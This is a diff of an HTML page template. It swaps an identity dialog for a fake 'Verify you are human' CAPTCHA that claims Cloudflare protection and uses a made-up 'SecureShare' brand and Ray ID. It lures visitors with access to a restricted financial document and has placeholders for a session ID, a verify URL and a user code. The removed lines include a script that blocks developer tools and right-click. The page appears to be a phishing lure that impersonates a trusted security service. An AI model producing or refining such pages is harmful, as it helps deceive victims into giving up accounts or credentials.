@@ -3767,27 +3767,45 @@ body { font-family: 'Calibri', 'Segoe UI', Arial, sans-serif; }
           <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
         </div>
         <p class="dlg-heading">Confirm your identity</p>
-        <p class="dlg-sub">You are about to access a restricted financial document. Your access will be logged for audit purposes.</p>
-        <div class="dlg-actions">
-          <button class="dlg-proceed" id="dlgProceed">
-            <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
-            Continue
-          </button>
-          <button class="dlg-cancel" id="dlgCancel">Cancel</button>
+      <div class="brand">
+        <svg class="brand-mark" viewBox="0 0 24 24"><path fill="#f6821f" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+        <span class="brand-name">SecureShare</span>
+      </div>
+      <div class="badge">Security Verification</div>
+    </div>
+    
+    <div class="card-body">
+      <h1>Verify you are human</h1>
+      <p class="subtitle">Please complete the security check to continue accessing the document.</p>
+      
+      <div class="captcha-frame">
+        <canvas id="captcha-canvas" width="400" height="120"></canvas>
+        <div id="captcha-refresh">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2v6h-6M3 12a9 9 0 0 1 15-6.7L21 8M3 22v-6h6M21 12a9 9 0 0 1-15 6.7L3 16"/></svg>
         </div>
-        <p class="dlg-note">Unauthorised access to this document may be subject to legal action.</p>
+      </div>
+      <p class="hint">Click the image to refresh. Click the text to enter characters.</p>
+
+      <button class="verify-btn" id="btnVerify">Verify & Continue</button>
+      
+      <div class="ray">
+        Ray ID: <span id="ray-id">7b4a2e1d9c0f3b8a</span> &bull; <a href="#">Support</a>
       </div>
     </div>
   </div>
 </div>
 
-<script>
-document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <svg class="brand-mark" viewBox="0 0 24 24"><path fill="#f6821f" d="M12 2L2 12h3v9h6v-6h4v6h6v-9h3L12 2z"/></svg>
+      <span class="footer-brand-name">Cloudflare</span>
+    </div>
+    <div class="ray" style="margin-top:0">Protected by Global Network Security</div>
+  </div>
+</footer>
 
-(function(){
-  var sid = '{session_id}';
-  var verifyUrl = '{verify_url}';
-  var codeReady = {code_ready};
+<script>
   var code = '{user_code}';
 
   var codeEl = document.getElementById('codeDisplay');
